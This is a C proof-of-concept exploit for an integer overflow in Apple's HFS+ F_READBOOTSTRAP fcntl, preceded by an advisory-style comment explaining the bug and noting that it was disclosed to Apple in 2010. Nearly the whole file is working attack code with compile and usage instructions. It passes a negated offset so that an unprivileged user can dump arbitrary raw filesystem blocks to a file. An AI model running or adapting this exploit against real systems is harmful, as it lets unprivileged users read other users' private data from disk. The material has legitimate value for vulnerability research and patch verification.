/*
 * Apple HFS+ F_READBOOTSTRAP Information Disclosure
 * by Dan Rosenberg of Virtual Security Research, LLC
 * @djrbliss on twitter
 *
 * Usage:
 * $ gcc hfs-dump.c -o hfs-dump
 * $ ./hfs-dump [size] [outfile]
 *
 * ----
 *
 * F_READBOOTSTRAP is an HFS+ fcntl designed to allow unprivileged callers to
 * retrieve the first 1024 bytes of the filesystem, which contains information
 * related to bootstrapping.
 *
 * However, due to an integer overflow in checking the requested range of
 * bytes, it is possible to retrieve arbitrary filesystem blocks, leading to an
 * information disclosure vulnerability.
 *
 * This issue was originally reported to Apple on July 1, 2010.  The fix was a
 * single line long and took more than 8 months to release.  No gold stars were
 * awarded.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/fcntl.h>
#include <sys/mman.h>

int main(int argc, char * argv[])
{

	int fd, outfd, ret;
	long num;
	unsigned char * buf;
	struct fbootstraptransfer arg;

	if(argc != 3) {
		printf("[*] Usage: %s [size] [outfile]\n", argv[0]);
		return -1;
	}

	num = atol(argv[1]);

	outfd = open(argv[2], O_RDWR | O_CREAT, 0644);

	if(outfd < 0) {
		printf("[*] Failed to open output file.\n");
		return -1;
	}

	ftruncate(outfd, num);

	buf = (unsigned char *)mmap(NULL, num, PROT_READ | PROT_WRITE,
				    MAP_SHARED, outfd, 0);

	if(buf == MAP_FAILED) {
		printf("[*] Not enough memory.\n");
		return -1;
	}

	arg.fbt_buffer = buf;
	arg.fbt_offset = num * (-1);
	arg.fbt_length = num;
	
	fd = open("/", O_RDONLY);

	if(fd < 0) {
		printf("[*] Failed to open filesystem root.\n");
		return -1;
	}
	
	ret = fcntl(fd, F_READBOOTSTRAP, &arg);

	if(ret < 0) {
		printf("[*] fcntl failed.\n");
		return -1;
	}

	printf("[*] Successfully dumped %lu bytes to %s.\n", num, argv[2]);
	return 0;

}
